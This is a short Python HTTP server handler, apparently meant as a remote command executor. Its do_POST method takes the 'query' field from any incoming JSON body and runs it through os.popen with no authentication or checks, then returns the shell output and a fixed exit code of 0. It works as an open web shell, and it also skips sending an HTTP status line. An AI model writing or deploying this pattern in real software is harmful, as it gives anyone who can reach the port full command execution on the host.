from http.server import BaseHTTPRequestHandler
import json
import os

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        task = json.loads(self.rfile.read(int(self.headers['Content-Length'])))
        command = task.get('query')
        output = os.popen(command).read()
        self.wfile.write(json.dumps({'stdout': output, 'code': 0}).encode())
